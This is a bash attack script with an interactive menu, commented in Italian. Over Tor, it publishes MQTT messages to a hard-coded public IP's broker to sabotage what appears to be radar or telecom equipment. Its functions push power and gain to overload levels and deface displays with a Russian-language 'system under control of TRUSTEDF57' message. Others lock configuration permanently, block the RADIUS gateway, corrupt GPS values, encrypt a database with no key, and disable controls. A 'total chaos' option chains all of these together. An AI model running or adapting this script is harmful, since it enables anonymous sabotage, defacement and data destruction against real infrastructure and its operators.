#!/bin/bash
# 🔥 RADAR CPE v1.45.1 - FORMATO WILDCARD # CORRETTO
# PAYLOAD BASATI SU STATUS CONNECTED - NO JSON COMPLESSI

IP="212.42.54.24"
PORT="1883"

clear_status() { torsocks mosquitto_sub -h $IP -p $PORT -t '#' -v -C 1 >/dev/null 2>&1; }

show_status() {
    echo "📊 STATUS RAPIDO:"
    torsocks mosquitto_sub -h $IP -p $PORT -t '#' -v -C 10 2>/dev/null | grep -E "(CONNECTED|ERROR|FAIL)"
}

max_power() {
    echo "⚡ MAX POWER - WILDCARD FORMAT"
    clear_status
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RRM/power" -m "100" &
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/68b58ad9-d0e3-4aaa-ab78-12b395781780/gain" -m "150" &
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/BACKEND/6a843e52-5a0c-4148-a714-3e17bdfeaa80/engine" -m "120" &
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RRM/overload" -m "true" &
    sleep 2
    show_status
}

deface_all() {
    echo "🎨 DEFACE - DIRECT STRING"
    clear_status
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/68b58ad9-d0e3-4aaa-ab78-12b395781780/display" -m "СИСТЕМА ПОД УПРАВЛЕНИЕМ TRUSTEDF57 SUCATEMELO" &
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-EXPORT-MW/7f897323-7904-4ae7-9179-7b3a74bb5944/display" -m "СИСТЕМА ПОД УПРАВЛЕНИЕМ TRUSTEDF57 SUCATEMELO" &
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/MONITOR/display" -m "СИСТЕМА ПОД УПРАВЛЕНИЕМ TRUSTEDF57 SUCATEMELO" &
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/CONFIG/overlay" -m "96px red blink TRUSTEDF57" &
    sleep 2
    show_status
}

lockdown() {
    echo "🔒 LOCKDOWN - SIMPLE COMMANDS"
    clear_status
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/CONFIG/lock" -m "permanent" &
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/DB/c655ffbd-d751-40a1-946a-7115fbffccad/ro" -m "true" &
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/LBS/gps" -m "999.999,999.999" &
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADIUS_GATEWAY/block" -m "all" &
    sleep 2
    show_status
}

aes_destroy() {
    echo "🔐 AES DESTROY - CRUDE"
    clear_status
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/CONFIG/destroy" -m "AES-256" &
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/DB/c655ffbd-d751-40a1-946a-7115fbffccad/encrypt" -m "no_key" &
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/68b58ad9-d0e3-4aaa-ab78-12b395781780/shutdown" -m "permanent" &
    sleep 2
    show_status
}

display_lock() {
    echo "👁️ DISPLAY LOCK"
    clear_status
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/MONITOR/mode" -m "deface_only" &
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/68b58ad9-d0e3-4aaa-ab78-12b395781780/controls" -m "disabled" &
    sleep 2
    show_status
}

total_chaos() {
    echo "💥 TOTAL CHAOS - RAPIDO"
    max_power
    sleep 1
    deface_all
    sleep 1
    lockdown
    sleep 1
    aes_destroy
    sleep 1
    display_lock
}

dump_status() {
    echo "📊 FULL DUMP:"
    torsocks mosquitto_sub -h $IP -p $PORT -t '#' -v -C 30 2>/dev/null | grep -v "CONNECTED"
}

# 🔥 MENU LOOP PERFETTO
while true; do
    clear
    echo "🔥==============================================="
    echo "    RADAR CPE v1.45.1 - WILDCARD # FORMAT"
    echo "    $IP:$PORT - LIVE STATUS MONITOR"
    echo "==============================================="
    echo "1) ⚡ MAX POWER (RRM/RADAR 150%)"
    echo "2) 🎨 DEFACE (96px russo blink)"  
    echo "3) 🔒 LOCKDOWN (CONFIG/DB/LBS)"
    echo "4) 🔐 AES DESTROY (no key)"
    echo "5) 👁️ DISPLAY LOCK (deface only)"
    echo "6) 💥 TOTAL CHAOS (1→5)"
    echo "7) 📊 LIVE STATUS"
    echo "8) 🔍 FULL DUMP"
    echo "0) ❌ EXIT"
    echo "==============================================="
    read -p "➤ " choice
    
    case $choice in
        1) max_power ;;
        2) deface_all ;;
        3) lockdown ;;
        4) aes_destroy ;;
        5) display_lock ;;
        6) total_chaos ;;
        7) show_status ;;
        8) dump_status ;;
        0) echo "👋 Bye!"; exit 0 ;;
        *) echo "❌ 0-8 only!"; sleep 1 ;;
    esac
    
    echo -e "\n[ENTER per menu...]"
    read
done
